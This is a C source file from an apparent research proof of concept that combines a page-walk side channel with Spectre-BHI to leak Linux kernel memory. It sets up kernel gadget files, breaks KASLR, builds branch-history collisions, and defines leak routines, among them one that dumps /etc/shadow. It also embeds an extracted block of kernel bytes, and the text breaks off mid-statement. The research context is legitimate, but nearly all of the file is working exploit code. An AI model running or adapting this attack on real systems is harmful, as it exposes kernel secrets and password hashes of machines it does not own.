#include "pwsc_spectre_bhi.h"

// Bring in the noise filter 
extern uint64_t noise_filter[64]; 

// Spectre config 
static uint64_t sys_call_table_off = 0x260; // VM Default
static struct config cfg = {0};


/*
 *   Opens one of the configured gadget fds for unmasked gadgets 
 *   This is code credited to the SLAM work. 
 */
int open_gadget_fd(void) {
#ifdef CGROUP_SEQFILE_SHOW
    if (access("/sys/fs/cgroup/cpu/cpu.idle", F_OK) == 0) {
        return open("/sys/fs/cgroup/cpu/cpu.idle", O_RDONLY);

    } else if (access("/sys/fs/cgroup/user.slice2/cpu.idle", F_OK) == 0) {
        return open("/sys/fs/cgroup/user.slice2/cpu.idle", O_RDONLY);

    } else {
        fprintf(stderr, "Error: Cgroup file not found, please update the path\n");
        return -1; 
    }
#endif 
#ifdef EXT4_FILE_WRITE_ITER
	return open("gadget.txt", O_CREAT, S_IRUSR|S_IWUSR|S_IROTH|S_IWOTH);
#endif
#ifdef HUGETLBFS_READ_ITER
	/* The file below must exist with the correct permissions, /mnt/huge
	 * must be backed by a hugetlbfs file system, and there must be
	 * hugepages available (cf. /proc/sys/vm/nr_hugepages).
	 */
	return open("/mnt/huge/gadget.txt", O_RDONLY, 0);
#endif
#if defined KERNFS_SEQ_SHOW
	return open("/sys/devices/system/cpu/uevent", O_RDONLY, 0);
#endif
#ifdef PROC_SIGNLE_SHOW
	return open("/proc/1/status", O_RDONLY, 0);
#endif
#ifdef RAW_SEQ_START
	return open("/proc/net/raw", O_RDONLY, 0);
#endif
#ifdef SEL_READ_MLS
	return open("/sys/fs/selinux/mls", O_RDONLY, 0);
#endif
	fprintf(stderr, "Didn't select target gadget!\n");
    return -1; 
}


void init_pwsc_spectre_bhi(void) {
    // Random seed 
    int seed = time(0);
    printf("Seed: %d\n", seed);
    srand(seed);

    // Get a huge page 
    cfg.ind_map = allocate_huge_page();

    // L2 evict set for syscall table 
    asm volatile("mfence\n");
    find_ev_set_for_sys_call_table(sys_call_table_off);
    asm volatile("mfence\n");

    // Find physical map start -- KASLR break 
    for (size_t i = 0; i < 5 && cfg.phys_start == 0; i++) {
        cfg.phys_start = (uint8_t *) find_phys_map_start();
    }
    if (cfg.phys_start == 0) {
        printf("Failed finding Physical Map start!");
        exit(EXIT_FAILURE);
    }

    // History setup 
    cfg.history = calloc(sizeof(uint64_t), MAX_HISTORY_SIZE);

    // Fd setup 
    cfg.fd = open_gadget_fd(); 
    assert(cfg.fd > 0);
    setup_for_pwsc(&cfg);

    // Get physical address of the huge page
    // I use the easier method here, see Inspectre work for ways to do it without 
    // the virt to physmap cheat (requires sudo)
    cfg.ind_map_kern = (uint8_t *)(virt_to_physmap((uint64_t)cfg.ind_map, (uint64_t) cfg.phys_start));
    while ((uint64_t) cfg.ind_map_kern % HUGE_PAGE_SIZE != 0) {
        fprintf(stderr, "Invalid huge_page! User: %p Kernel: %p\n", cfg.ind_map, cfg.ind_map_kern);
        sleep(1);
        cfg.ind_map_kern = (uint8_t *)(virt_to_physmap((uint64_t)cfg.ind_map, (uint64_t) cfg.phys_start));
    }
    printf("User huge page addr: %p Kernel huge page addr: %p\n", cfg.ind_map, cfg.ind_map_kern);
    find_hp_kern_address(&cfg, 1);
    cfg.fr_buf = cfg.ind_map + HUGE_PAGE_SIZE - 0x1000;
    cfg.fr_buf_kern = cfg.ind_map_kern + HUGE_PAGE_SIZE - 0x1000;

    // Get history collision 
    find_colliding_history(&cfg);

    // PWSC setup + config 
    pwsc_init_reset(setup_trigger_bhi, pre_pp_setup, trigger_bhi, 
                    MEMORY_MAP_ORDER_ORACLE_EVICT_SIZES, THRESHOLD_FAST, NUM_TRIALS_FAST); 
    printf("pwsc spectre-bhi init done!\n\n\n\n");
    fflush(stdout); 
}


void leak_etc_shadow(uint64_t target_shadow) {
    // Leak etc shadow!  
    uint64_t init_noise_filter[64] = {0};
    struct bit_map *map = leak_addr_range(target_shadow, target_shadow + 93, 1, init_noise_filter, 1); 
    if(!map) exit(1);
    extract_string(map); 

    // clean up 
    destroy_bit_map(map);
}


void leak_ascii(uint64_t addr, uint64_t size) {
    uint64_t init_noise_filter[64] = {0};

    // Leak ASCII + printout the string
    struct bit_map *map = leak_addr_range(addr - 6, addr + size - 6, 1, init_noise_filter, 1); 
    if(!map) exit(1);
    extract_string(map); 

    // clean up 
    destroy_bit_map(map);
}


uint64_t leak_u64(uint64_t kern_addr) {
    // We need a little more control in this function to not report missing information
    // Therefore we have to use the lower level function leak_userspace_ptr and apply set
    // init_noise_filter ourselves instead of with leak_addr_range. The main goal is that 
    // we have to be absolutely certain we leaked the correct set of bits. If we are even
    // a little uncertain we report nothing instead. 
    uint64_t init_noise_filter[64] = {0};
    int PO = kern_addr % 4096; 
    int PO_set = (PO / 64) % ncache_lines;
    init_noise_filter[PO_set] += 2; 
    init_noise_filter[(PO_set + 1) % ncache_lines] += 2;
    struct pwsc_ans ans = leak_userspace_ptr(kern_addr, init_noise_filter, ncache_lines);

    // This is to make sure we are CERTAIN! If this isn't there we will fail the Dilithium PoC
    if(ans.num_lines_found < 3) 
        ans.va.va = 0; // zero it out!
    return ans.va.va; 
}


void test_leak_u64(void) {
    uint64_t secret = 0x00006a6bffffe2abUL; 
    secret = SET_VA_VPN4_TO_LINE(secret, 5 + (rand() % 16)); 
    secret = SET_VA_VPN3_TO_LINE(secret, rand() % 64); 
    secret = SET_VA_VPN2_TO_LINE(secret, rand() % 64); 
    secret = SET_VA_VPN1_TO_LINE(secret, rand() % 64);
    *(uint64_t *)(cfg.fr_buf) = secret; 
    uint64_t ans = leak_u64((uint64_t)cfg.fr_buf_kern); 
    fprintf(stderr, "Secret: 0x%016lx\n", secret);
    fprintf(stderr, "ans:    0x%016lx\n", ans);
}


// This is pulled from the linux kernel using LiME. It was specifically chosen 
// because it contains a lot of interesting bytes and is difficult to leak. 
static uint8_t kernel_extract[] = {0x0f,0xfa,0xea,0x09,0x10,0x08,0x98,0x00,0xc8,0x8c,0xd8,0x8e,0xc0,0x8e,0xd0,0x8e,
0xbc,0x66,0x60,0x20,0x00,0x00,0x57,0xe8,0x66,0x00,0xc0,0x85,0x20,0x75,0x0f,0x66,
0x1e,0x01,0x00,0x60,0x0f,0x66,0x16,0x01,0x00,0x30,0x18,0xba,0x66,0x00,0x33,0xb8,
0x05,0x00,0x0f,0x00,0xc0,0x22,0xea,0x66,0xa0,0x00,0x00,0x09,0x00,0x08,0xeb,0xf4,
0x8d,0xfd,0x26,0xb4,0x00,0x00,0x00,0x00,0xb4,0x8d,0x00,0x26,0x00,0x00,0x90,0x00,
0xea,0xfa,0x10,0x56,0x98,0x00,0xc8,0x8c,0xd8,0x8e,0xc0,0x8e,0xd0,0x8e,0xbc,0x66,
0x60,0x20,0x00,0x00,0xb8,0xeb,0xb4,0x8d,0x00,0x26,0x00,0x00,0x8d,0x00,0x00,0x76,
0x6a,0x9c,0x9d,0x00,0x9c,0x66,0x58,0x66,0x89,0x66,0x66,0xc3,0x00,0x35,0x20,0x00,
0x66,0x00,0x66,0x50,0x66,0x9d,0x66,0x9c,0x66,0x58,0xc3,0x39,0x84,0x0f,0x00,0xfb,
0xb8,0x66,0x00,0x00,0x00,0x00,0xa2,0x0f,0x83,0x66,0x01,0xf8,0x82,0x0f,0x00,0xeb,
0xff,0x31,0x81,0x66,0x41,0xfb,0x74,0x75,0x75,0x68,0x66,0x17,0xfa,0x81,0x6e,0x65,
0x69,0x74,0x0e,0x75,0x81,0x66,0x63,0xf9,0x4d,0x41,0x75,0x44,0xbf,0x05,0x00,0x01,
0x5a,0xeb,0x81,0x66,0x47,0xfb,0x6e,0x65,0x75,0x75,0x66,0x51,0xfa,0x81,0x6e,0x69,
0x49,0x65,0x48,0x75,0x81,0x66,0x6e,0xf9,0x65,0x74,0x75,0x6c,0x66,0x3f,0x01,0xb8,
0x00,0x00,0x0f,0x00,0x66,0xa2,0xc1,0x89,0x25,0x66,0x0f,0x00,0x0f,0xf0,0xc1,0x66,
0x08,0xe8,0x83,0x66,0x06,0xf8,0x13,0x77,0x22,0x72,0x81,0x66,0xf0,0xe1,0x0f,0x00,
0x66,0x00,0xe9,0xc1,0x66,0x04,0xf9,0x83,0x72,0x0d,0x66,0x11,0xa0,0xb9,0x00,0x01,
0x0f,0x00,0x66,0x32,0xba,0x0f,0x02,0xf2,0x02,0x73,0x30,0x0f,0xb8,0x66,0x00,0x01,
0x00,0x00,0xa2,0x0f,0x81,0x66,0x61,0xe2,0x00,0x81,0x66,0x07,0xf2,0x81,0x81,0x61,
0x07,0x00,0x57,0x75,0xb8,0x66,0x00,0x00,0x80,0x00,0xa2,0x0f,0x3d,0x66,0x00,0x01,
0x80,0x00,0x47,0x72,0xb8,0x66,0x00,0x01,0x80,0x00,0xa2,0x0f,0x81,0x66,0x00,0xe2,
0x00,0x00,0x66,0x20,0xf2,0x81,0x00,0x00,0x20,0x00,0x2f,0x75,0xb8,0x66,0x00,0x01,
0x00,0x00,0xa2,0x0f,0x81,0x66,0x00,0xe2,0x00,0x00,0x66,0x06,0xfa,0x81,0x00,0x00,
0x06,0x00,0x20,0x74,0xff,0x85,0x13,0x74,0xb9,0x66,0x00,0x15,0xc0,0x01,0x32,0x0f,
0x0f,0x66,0xf0,0xba,0x0f,0x0f,0x31,0x30,0xeb,0xff,0x9d,0xd1,0xb8,0x66,0x00,0x01,
0x00,0x00,0xcc,0xc3,0x66,0x9d,0xc0,0x31,0xcc,0xc3,0x90,0x66,0x90,0x66,0x90,0x66,
0x31,0x66,0x0f,0xc9,0xc2,0x20,0x83,0x66,0x11,0xe2,0x81,0x66,0x00,0xca,0x00,0x00,
0x0f,0x60,0xc2,0x22,0x22,0x0f,0x0f,0xd9,0xc2,0x20,0xf7,0x66,0x00,0xc2,0x00,0x00,
0x74,0x60,0x0f,0x02,0x80,0x09,0x10,0xe2,0x22,0x0f,0xea,0xc2,0x11,0xd0,0x98,0x00,
0xc0,0x21,0x13,0x74,0x00,0xb8,0x8e,0x10,0xbc,0xd0,0xf0,0x00,0x07,0xb8,0xbb,0x53,
0x00,0x01,0x03,0xb9,0xcd,0x00,0xea,0x15,0xff,0xf0,0xf0,0x00,0x90,0x66,0x90,0x66,
0xfc,0xfa,0xf7,0xea,0x00,0x11,0xb9,0x98,0x00,0x10,0x66,0x2e,0x01,0x0f,0xa0,0x16,
0x0f,0x00,0xc0,0x20,0x01,0x0c,0x22,0x0f,0xea,0xc0,0x12,0x0e,0x00,0x08,0xd9,0x8e,
0xc1,0x8e,0xd1,0x8e,0xe1,0x8e,0xe9,0x8e,0xfe,0x24,0x22,0x0f,0xea,0xc0,0x12,0x22,
0x98,0x00,0xc8,0x8c,0xd0,0x8e,0xbc,0x66,0x60,0x20,0x00,0x00,0xd8,0x8e,0xc0,0x8e,
0xe0,0x8e,0xe8,0x8e,0x0f,0x66,0x1e,0x01,0x00,0xc0,0x6a,0x66,0x66,0x00,0x66,0x9d,
0x48,0xa1,0x66,0x30,0x11,0x3d,0xee,0x11,0x75,0x51,0x66,0x32,0x60,0xa1,0x66,0x62,
0x82,0x3d,0xa2,0x2c,0x75,0x65,0x66,0x26,0x7f,0xe8,0x00,0x0c,0x66,0x00,0x3e,0x8b,
0x30,0x3c,0x0f,0x66,0xe7,0xba,0x73,0x00,0x66,0x11,0x34,0xa1,0x66,0x30,0x16,0x8b,
0x30,0x38,0xb9,0x66,0x01,0xa0,0x00,0x00,0x30,0x0f,0x83,0xe9,0xf4,0xfd,0xfd,0xeb,
0x66,0xee,0x66,0xc3,0xc2,0x89,0x66,0xec,0xef,0xc3,0xc3,0x66,0xba,0x66,0x00,0x80,
0x00,0x00,0x31,0x66,0xff,0xc0,0x24,0x26,0x66,0x60,0x67,0x53,0x8d,0x66,0xff,0x58,
0xe8,0x66,0xff,0xe6,0xff,0xff,0x83,0x66,0x01,0xeb,0xf4,0x73,0x5b,0x66,0xc3,0x66,
0x53,0x66,0x52,0x66,0x31,0x66,0x66,0xdb,0xc0,0x85,0x5e,0x74,0x89,0x66,0x66,0xc1,
0xdd,0xb8,0x12,0x34,0x66,0x00,0xd2,0x31,0xf7,0x66,0x67,0xf1,0x89,0x66,0x24,0x04,
0xba,0x66,0x00,0x43,0x00,0x00,0xb8,0x66,0x00,0xb6,0x00,0x00,0xff,0x66,0x24,0x16,
0x66,0x60,0xa5,0xe8,0xff,0xff,0x67,0xff,0x0f,0x66,0x04,0xb6,0x66,0x24,0x42,0xba,
0x00,0x00,0x66,0x00,0x16,0xff,0x60,0x24,0xe8,0x66,0xff,0x8e,0xff,0xff,0x66,0x67,
0x04,0x8b,0x66,0x24,0xb6,0x0f,0x66,0xc4,0x42,0xba,0x00,0x00,0x66,0x00,0x16,0xff,
0x60,0x24,0xe8,0x66,0xff,0x74,0xff,0xff,0x03,0xb3,0xb8,0x66,0x00,0x61,0x00,0x00,
0xff,0x66,0x20,0x16,0x66,0x60,0x61,0xe8,0xff,0xff,0x66,0xff,0xb6,0x0f,0x66,0xc3,
0x61,0xba,0x00,0x00,0x66,0x00,0x16,0xff,0x60,0x24,0x58,0x66,0x5b,0x66,0x4b,0xe9,
0x66,0xff,0x66,0x53,0xc3,0x89,0x0f,0x66,0xc8,0xb7,0x0f,0x66,0xc2,0xb6,0x89,0x66,
0x66,0xca,0x16,0xff,0x60,0x24,0x66,0x67,0x43,0x8d,0x66,0x01,0xb7,0x0f,0x66,0xc0,
0xff,0x5b,0x20,0x26,0x66,0x60,0xb7,0x0f,0x66,0xd2,0xe0,0xc1,0x66,0x08,0xb6,0x0f,
0x66,0xc9,0xc8,0x01,0x0f,0x66,0xc0,0xb7,0x26,0xff,0x60,0x28,0x80,0x67,0x40,0xb8,
0x00,0x60,0x00,0x00,0x4d,0x75,0x56,0x66,0x53,0x66,0x89,0x66,0x67,0xc6,0x80,0xc6,
0x60,0x40,0x00,0x00,0x66,0x01,0x10,0xbb,0x00,0x01,0x66,0x00,0xfb,0x81,0x01,0x64,
0x00,0x00,0x29,0x73,0x66,0x67,0x73,0x39,0x75,0x14,0x67,0x1c,0x8b,0x66,0x08,0x43,
0x85,0x66,0x74,0xc0,0x66,0x0a,0xd0,0xff,0x66,0x67,0x43,0x89,0xeb,0x10,0x66,0x08,
0xc0,0x31,0x66,0x67,0x43,0x89,0x66,0x10,0xc3,0x83,0xeb,0x1c,0x66,0xce,0x66,0x5b,
0x66,0x5e,0x66,0xc3,0x66,0xc3,0x10,0xba,0x00,0x01,0x66,0x00,0xfa,0x81,0x01,0x64,
0x00,0x00,0x05,0x72,0x31,0x66,0x66,0xc0,0x66,0xc3,0x66,0x56,0x67,0x53,0x8b,0x66,
0x0c,0x72,0x66,0x67,0x5a,0x8b,0x66,0x10,0xc9,0x31,0x39,0x66,0x7e,0xcb,0x67,0x0a,
0x04,0x39,0x74,0xce,0x66,0x16,0xeb,0x41,0x66,0xf1,0xc2,0x83,0x66,0x1c,0xfa,0x81,
0x01,0x64,0x00,0x00,0xd7,0x72,0x31,0x66,0xeb,0xc0,0x66,0x06,0x01,0xb8,0x00,0x00,
0x66,0x00,0x66,0x5b,0x66,0x5e,0x3d,0xc3,0x0f,0x04,0x84,0x0f,0x01,0xff,0x55,0x66,
0x57,0x66,0x56,0x66,0x53,0x66,0x83,0x66,0x18,0xec,0xbb,0x66,0x0f,0x00,0x00,0x00,
0xf8,0x83,0x74,0xff,0x66,0x0e,0xc3,0x89,0xf8,0x83,0x75,0xfe,0x66,0x06,0x01,0xbb,
0x00,0x0f,0x66,0x00,0xde,0x89,0xe6,0x81,0x7f,0xff,0xba,0x66,0x01,0x10,0x00,0x00,
0x31,0x66,0x67,0xff,0x89,0x66,0x24,0x3c,0x89,0x66,0x66,0xd8,0xff,0x25,0x00,0x7f,
0x67,0x00,0x89,0x66,0x24,0x44,0x66,0x08,0xfa,0x81,0x01,0x64,0x00,0x00,0x83,0x0f,
0x00,0x8c,0x66,0x67,0x42,0x8b,0x67,0x0c,0x8b,0x66,0x10,0x4a,0x66,0x67,0x4c,0x89,
0x0c,0x24,0x31,0x66,0x67,0xc9,0x89,0x66,0x24,0x4c,0x67,0x04,0x8b,0x66,0x24,0x7c,
0x67,0x0c,0x39,0x66,0x24,0x7c,0x7d,0x04,0x67,0x5e,0x0f,0x66,0x78,0xb7,0x85,0x02,
0x75,0xff,0x67,0x07,0x78,0x83,0x00,0x04,0x17,0x74,0x66,0x67,0x6c,0x8b,0x08,0x24,
0x66,0x67,0x2c,0x39,0x0f,0x24,0x8a,0x84,0x66,0x00,0x01,0xbd,0x00,0x00,0xeb,0x00,
0x66,0x03,0xed,0x31,0x3b,0x67,0x74,0x30,0x67,0x7a,0x0f,0x66,0x48,0xb7,0x66,0x04,
0xe1,0xc1,0x66,0x08,0xf9,0x01,0x66,0x67,0x7c,0x8b,0x08,0x24,0x39,0x66,0x74,0xf9,
0x66,0x62,0xfd,0x83,0x67,0x01,0x83,0x66,0x24,0x1c,0x67,0xff,0xff,0x66,0x24,0x44,
0x66,0x04,0xc0,0x83,0xeb,0x08,0x66,0x94,0xc2,0x83,0xe9,0x1c,0xff,0x69,0xba,0x66,
0x01,0x10,0x00,0x00,0x0f,0x66,0xce,0xb7,0x04,0xeb,0x83,0x66,0x1c,0xc2,0x81,0x66,
0x64,0xfa,0x00,0x01,0x73,0x00,0x67,0x39,0x0f,0x66,0x42,0xb7,0x39,0x18,0x72,0xc6,
0x67,0xe9,0x0f,0x66,0x7a,0xb7,0x66,0x1a,0xf8,0x01,0x39,0x66,0x7d,0xc1,0x67,0xdb,
0x74,0x89,0x10,0x24,0x31,0x66,0x67,0xc0,0x89,0x66,0x24,0x44,0x67,0x12,0x8d,0x66,
0x24,0x44,0x67,0x10,0xff,0x66,0x04,0x52,0x85,0x66,0x74,0xc0,0xe9,0x0a,0x00,0xbf,
0x83,0x66,0xff,0xc8,0xb8,0xe9,0x85,0x00,0x0f,0xdb,0xaf,0x89,0x8e,0x00,0x66,0xe0,
0x85,0xb8,0x00,0x04,0x64,0x00,0x8a,0x67,0x66,0x18,0xb6,0x0f,0x66,0xdb,0x34,0xa1,
0x66,0x60,0xc0,0x85,0x10,0x75,0xb8,0x66,0x04,0x84,0x00,0x00,0x67,0x64,0x00,0x8a,
0x0f,0x66,0xc0,0xb6,0x40,0x66,0x0f,0x66,0xd8,0xaf,0x4b,0x66,0xe8,0x66,0x02,0xb5,
0x00,0x00,0x0f,0x66,0xf0,0xb7,0xba,0x66,0x00,0x11,0x00,0x00,0x89,0x66,0x66,0xf0,
0x8c,0xe8,0xff,0xfd,0x66,0xff,0xe0,0x83,0x66,0x7f,0x11,0xb9,0x00,0x00,0x66,0x00,
0xf2,0x89,0xe8,0x66,0xfd,0x9d,0xff,0xff,0x0f,0x66,0xc3,0xb6,0xb9,0x66,0x00,0x12,
0x00,0x00,0x89,0x66,0x66,0xf2,0x8a,0xe8,0xff,0xfd,0x66,0xff,0x07,0xba,0x00,0x00,
0x66,0x00,0xf0,0x89,0xe8,0x66,0xfd,0x57,0xff,0xff,0x83,0x66,0xbd,0xe0,0xc2,0x88,
0x89,0x66,0x66,0xd8,0xe8,0xc1,0x66,0x07,0xe0,0x83,0x66,0x02,0xeb,0xc1,0x66,0x03,
0xe3,0x83,0x66,0x40,0xd8,0x09,0x09,0x66,0x66,0xd0,0xb6,0x0f,0x66,0xc0,0x07,0xb9,
0x00,0x00,0x66,0x00,0xf2,0x89,0xe8,0x66,0xfd,0x49,0xff,0xff,0x31,0x66,0x66,0xc0,
0xc4,0x83,0x66,0x18,0x66,0x5b,0x66,0x5e,0x66,0x5f,0x66,0x5d,0x66,0xc3,0xc0,0x31,
0xc3,0x66,0x57,0x56,0xc7,0x89,0xd6,0x89,0xc1,0x51,0x02,0xe9,0x66,0xf3,0x59,0xa5,
0xe1,0x83,0xf3,0x03,0x5f,0xa4,0x66,0x5e,0x57,0xc3,0xc7,0x89,0x0f,0x66,0xc2,0xb6,
0x69,0x66,0x01,0xc0,0x01,0x01,0x51,0x01,0xe9,0xc1,0xf3,0x02,0xab,0x66,0x83,0x59,
0x03,0xe1,0xaa,0xf3,0x66,0x5f,0x1e,0xc3,0xa0,0x0f,0x66,0x1f,0xc1,0xe8,0xff,0xff,
0x1f,0xff,0xc3,0x66,0x0f,0x06,0x07,0xa0,0xe8,0x66,0xff,0xb4,0xff,0xff,0x66,0x07,
0x66,0xc3,0x66,0x57,0xc2,0x89,0xb9,0x66,0x00,0x0b,0x00,0x00,0x31,0x66,0x66,0xc0,
0xd7,0x89,0xf3,0x66,0x67,0xab,0xc7,0x66,0x28,0x42,0x00,0x01,0x00,0x00,0xd8,0x8c,
0x89,0x67,0x26,0x42,0x89,0x67,0x24,0x42,0xe0,0x8c,0x89,0x67,0x22,0x42,0xe8,0x8c,
0x89,0x67,0x20,0x42,0x5f,0x66,0xc3,0x66,0x0f,0x66,0xd2,0xb7,0xc1,0x66,0x08,0xe0,
0x0f,0x66,0xc9,0xb6,0x01,0x66,0x66,0xc8,0xb7,0x0f,0xff,0xc0,0x28,0x26,0x66,0x60,
0xec,0x83,0x66,0x58,0xe0,0x89,0xe8,0x66,0xff,0xa5,0xff,0xff,0xc7,0x67,0x24,0x44,
0x00,0x1c,0x67,0x12,0x44,0xc6,0x10,0x24,0x67,0x10,0x8d,0x66,0x24,0x4c,0x66,0x2c,
0xe2,0x89,0xb8,0x66,0x00,0x10,0x00,0x00,0xe8,0x66,0x08,0x9f,0x00,0x00,0x31,0x66,
0x67,0xc0,0x7c,0x80,0x3c,0x24,0x74,0x10,0x67,0x2a,0x44,0xc7,0x1c,0x24,0x1a,0x00,
0x66,0x67,0x4c,0x8d,0x2c,0x24,0x89,0x66,0x66,0xe2,0x10,0xb8,0x00,0x00,0x66,0x00,
0x78,0xe8,0x00,0x08,0x66,0x00,0xc0,0x31,0x80,0x67,0x24,0x7c,0x1a,0x48,0x94,0x0f,
0x66,0xc0,0x66,0x40,0x3c,0xa3,0x67,0x60,0x8b,0x66,0x85,0x14,0x00,0xe0,0x00,0x00,
0x89,0x66,0x1c,0x16,0x67,0x01,0x8b,0x66,0x85,0x14,0x00,0xd4,0x00,0x00,0x89,0x66,
0x10,0x16,0x67,0x01,0x8b,0x66,0x85,0x04,0x00,0xc8,0x00,0x00,0x83,0x66,0x58,0xc4,
0xc3,0x66,0x83,0x66,0x2c,0xec,0x89,0x66,0x66,0xe0,0x12,0xe8,0xff,0xff,0x67,0xff,
0x44,0xc7,0x1c,0x24,0x11,0x12,0x31,0x66,0x66,0xc9,0xe2,0x89,0xb8,0x66,0x00,0x10,
0x00,0x00,0xe8,0x66,0x08,0x15,0x00,0x00,0xc7,0x67,0x24,0x44,0x00,0x1c,0x67,0x12,
0x44,0xc6,0x10,0x24,0x66,0x20,0xc9,0x31,0x89,0x66,0x66,0xe2,0x10,0xb8,0x00,0x00,
0x66,0x00,0xf6,0xe8,0x00,0x07,0x67,0x00,0x44,0xc7,0x1c,0x24,0x12,0x01,0xc6,0x67,
0x24,0x44,0x34,0x10,0x31,0x66,0x66,0xc9,0xe2,0x89,0xb8,0x66,0x00,0x10,0x00,0x00,
0xe8,0x66,0x07,0xd7,0x00,0x00,0xc7,0x67,0x24,0x44,0x00,0x1c,0x67,0x01,0x44,0xc7,
0x18,0x24,0x06,0x07,0x31,0x66,0x66,0xc9,0xe2,0x89,0xb8,0x66,0x00,0x10,0x00,0x00,
0xe8,0x66,0x07,0xb7,0x00,0x00,0x83,0x66,0x2c,0xc4,0xc3,0x66,0x83,0x66,0x2c,0xec,
0x89,0x66,0x66,0xe0,0x88,0xe8,0xff,0xfe,0x67,0xff,0x44,0xc7,0x1c,0x24,0x11,0x11,
0x31,0x66,0x66,0xc9,0xe2,0x89,0xb8,0x66,0x00,0x10,0x00,0x00,0xe8,0x66,0x07,0x8b,
0x00,0x00,0xc7,0x67,0x24,0x44,0x01,0x1c,0x67,0x12,0x44,0xc6,0x10,0x24,0x66,0x34,
0xc9,0x31,0x89,0x66,0x66,0xe2,0x10,0xb8,0x00,0x00,0x66,0x00,0x6c,0xe8,0x00,0x07,
0x67,0x00,0x44,0xc7,0x1c,0x24,0x01,0x00,0xc7,0x67,0x24,0x44,0x0c,0x18,0x66,0x0b,
0xc9,0x31,0x89,0x66,0x66,0xe2,0x10,0xb8,0x00,0x00,0x66,0x00,0x4c,0xe8,0x00,0x07,
0x66,0x00,0xc4,0x83,0x66,0x2c,0x66,0xc3,0xcc,0xb8,0x00,0x03,0x66,0x00,0x16,0xff,
0x60,0x20,0xc2,0x88,0xb8,0x66,0x03,0xb4,0x00,0x00,0xe2,0x80,0x74,0x01,0x66,0x06,
0xd4,0xb8,0x00,0x03,0x66,0x00,0x66,0xc3,0x66,0x53,0xd8,0xe8,0xff,0xff,0x66,0xff,
0xb7,0x0f,0x66,0xd8,0x11,0xb9,0x00,0x00,0x66,0x00,0xda,0x89,0xb8,0x66,0x00,0x0c,
0x00,0x00,0xe8,0x66,0xfe,0x20,0xff,0xff,0xb9,0x66,0x00,0x06,0x00,0x00,0x89,0x66,
0x66,0xda,0x0b,0xb8,0x00,0x00,0x66,0x00,0x0b,0xe8,0xff,0xfe,0x66,0xff,0x07,0xb9,
0x00,0x00,0x66,0x00,0xda,0x89,0xb8,0x66,0x00,0x3e,0x00,0x00,0xe8,0x66,0xfd,0xf6,
0xff,0xff,0xb9,0x66,0x00,0x10,0x00,0x00,0x89,0x66,0x66,0xda,0xea,0xb8,0x00,0x00,
0x66,0x00,0xe1,0xe8,0xff,0xfd,0x66,0xff,0x12,0xb9,0x00,0x00,0x66,0x00,0xda,0x89,
0xb8,0x66,0x00,0xdf,0x00,0x00,0xe8,0x66,0xfd,0xcc,0xff,0xff,0xb9,0x66,0x00,0x15,
0x00,0x00,0x89,0x66,0x66,0xda,0xe7,0xb8,0x00,0x00,0x66,0x00,0xb7,0xe8,0xff,0xfd,
0x66,0xff,0x16,0xb9,0x00,0x00,0x66,0x00,0xda,0x89,0xb8,0x66,0x00,0x04,0x00,0x00,
0xe8,0x66,0xfd,0xa2,0xff,0xff,0xb8,0x66,0x03,0xcc,0x00,0x00,0xff,0x66,0x20,0x16,
0x66,0x60,0xe0,0x83,0x0c,0x0d,0x66,0xe2,0xc2,0xba,0x00,0x03,0x66,0x00,0xff,0x5b,
0x24,0x26,0x66,0x60,0x66,0x56,0x66,0x53,0xc3,0x89,0xe8,0x66,0xff,0x17,0xff,0xff,
0x0f,0x66,0xf0,0xb7,0xb9,0x66,0x00,0x07,0x00,0x00,0x89,0x66,0x66,0xf2,0x3e,0xb8 }; 


void paper_stats(void) {
    // info dump
    fprintf(stderr, "0x%016lx 0x%016lx\n", (uint64_t)cfg.ind_map_kern, (uint64_t)cfg.fr_buf_kern);

    // Secret setup 
    uint64_t secret_size = sizeof(kernel_extract); 
    char *secret = (char *)kernel_extract;
    memcpy((void *)cfg.ind_map, (const void *)secret, secret_size);
    for(int i = 0; i < secret_size; i++) 
        assert(((char *)cfg.ind_map)[i] == secret[i]); 

    // Measuring time taken to dump the kernel memory 
    uint64_t init_noise_filter[64] = {0};
    struct timespec tstart={0,0}, tend={0,0};
    clock_gettime(CLOCK_MONOTONIC, &tstart);
    asm volatile("");
    struct bit_map *ans = leak_addr_range((uint64_t)cfg.ind_map_kern, (uint64_t)cfg.ind_map_kern - 5 + secret_size, 1, init_noise_filter, 0); 
    asm volatile("");
    clock_gettime(CLOCK_MONOTONIC, &tend);
    printf("some_long_computation took about %.5f seconds\n",
           ((double)tend.tv_sec + 1.0e-9*tend.tv_nsec) - 
           ((double)tstart.tv_sec + 1.0e-9*tstart.tv_nsec));
    accuracy(ans, secret);

    // output 
    extract_string(ans);
}   


void pwsc_test(void) {

    // Pick a random seed 
    srand(time(0));

    // Reconfigure PWSC to use the PWC order oracle 
    // For some reason we observe a high signal at cache set 0 that we need to mask out 
    // We don't use DEFAULT_EVICT_SIZES since those (while faster) lead to bad results in Spectre-BHI 
    // use cases. 
    uint64_t init_evict_size[MAX_PAGE_LEVELS] = {1920, 8, 0, 2};
    pwsc_init_reset(setup_trigger_bhi, pre_pp_setup, trigger_bhi, init_evict_size, THRESHOLD_USUAL, NUM_TRIALS_USUAL);
    noise_filter[0] += 2;

    // Pick a random secret 
    uint64_t addr = 0x666666aaa000; 
    addr = SET_VA_VPN4_TO_LINE(addr, 5);
    addr = SET_VA_VPN3_TO_LINE(addr, rand() % 64); 
    addr = SET_VA_VPN2_TO_LINE(addr, rand() % 64); 
    addr = SET_VA_VPN1_TO_LINE(addr, rand() % 64);
    volatile uint64_t *secret = mmap ((void *)addr, 4096,
                PROT_READ | PROT_WRITE,
                MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE,
                -1, 0 );
    secret = (volatile uint64_t *)SET_VA_PO_TO_LINE(secret, rand() % 64);
    *secret = 0x5A; 
    asm volatile("mfence\n");
    
    // Set secret address to the secret 
    set_pwsc_load_chain(&cfg, (uint64_t)secret); 

    // Run PWSC 
    struct pwsc_ans pwsc_ret = run_pwsc((uint64_t)cfg.ind_map_kern); 
    virtual_address_t ans = pwsc_ret.va; 

    // Output results
    fprintf(stderr, 
            "Secret: 0x%lx VPN4 set: %lu VPN3 set: %lu VPN2 set: %lu VPN1 set: %lu PO set: %lu\n", 
        (uint64_t) secret,
        VPN4_TO_CACHE_LINE((uint64_t)secret), 
        VPN3_TO_CACHE_LINE((uint64_t)secret), 
        VPN2_TO_CACHE_LINE((uint64_t)secret), 
        VPN1_TO_CACHE_LINE((uint64_t)secret), 
        PO_TO_CACHE_LINE((uint64_t)secret));
    fprintf(stderr, 
            "Leaked Value: 0x%lx VPN4 set: %lu VPN3 set: %lu VPN2 set: %lu VPN1 set: %lu PO set: %lu\n", 
        ans.va,
